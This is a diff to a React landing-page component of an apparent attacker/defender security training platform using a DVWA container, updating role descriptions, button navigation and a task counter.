             </h2>
 
             <p className="content__description" ref={descRef}>
               {isAttacker
-                ? 'EXPLOIT HIGH-VALUE SYSTEM VECTORS, EXTRACT PRIVILEGED CREDENTIALS, AND COMPROMISE TARGET ARCHITECTURES.'
-                : 'MONITOR REAL-TIME TELEMETRY, FORMULATE WAF INSPECT FILTERS, AND FORTIFY HOST SECURITY TOPOLOGY.'}
+                ? 'EXPLOIT HIGH-VALUE SYSTEM VECTORS, EXTRACT PRIVILEGED CREDENTIALS, AND COMPROMISE TARGET ARCHITECTURES DIRECTLY WITHIN THE DVWA CONTAINER ENVIRONMENT.'
+                : 'MONITOR REAL-TIME TELEMETRY, ENFORCE L4/L7 IPTABLES POLICIES, AND REPLAY WEAPONIZED ATTACK PAYLOADS TO CERTIFY HOST ZERO-DAY IMMUNITY.'}
             </p>
 
-            {/* "More ->" link in the middle (strictly in the middle, not on each task) */}
+            {/* "More ->" link in the middle (strictly in the middle, navigates to TaskMatrixPage) */}
             <button
               ref={buttonRef}
-              onClick={() => setShowOverviewModal(true)}
+              onClick={() => {
+                if (onNavigateToTasks) {
+                  onNavigateToTasks();
+                } else {
+                  setShowOverviewModal(true);
+                }
+              }}
               className={`content__button ${
                 isAttacker ? 'text-red-400 hover:text-red-300' : 'text-[#2ab7ff] hover:text-[#7ad6ff]'
               }`}
@@ -652,7 +316,7 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
           {/* 3-Column Tactical Task Gallery Grid (12 Items) */}
           <div className="gallery">
             <ul className="gallery__grid" ref={gridRef}>
-              {tasks.map((task) => (
+              {galleryTasks.map((task) => (
                 <li key={task.id} className="gallery__item">
                   <div
                     className={`gallery__task-box ${
@@ -698,7 +362,7 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
         </div>
       </section>
 
-      {/* ---------------- TACTICAL MODAL (Opened from "More ->" in the middle) ---------------- */}
+      {/* ---------------- TACTICAL MODAL (Opened only if fallback) ---------------- */}
       {showOverviewModal && (
         <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
           <div
@@ -734,7 +398,7 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
                       isAttacker ? 'text-red-400' : 'text-[#2ab7ff]'
                     }`}
                   >
-                    12 Active Protocols Deployed
+                    21 Active Protocols Deployed
                   </span>
                 </div>
               </div>
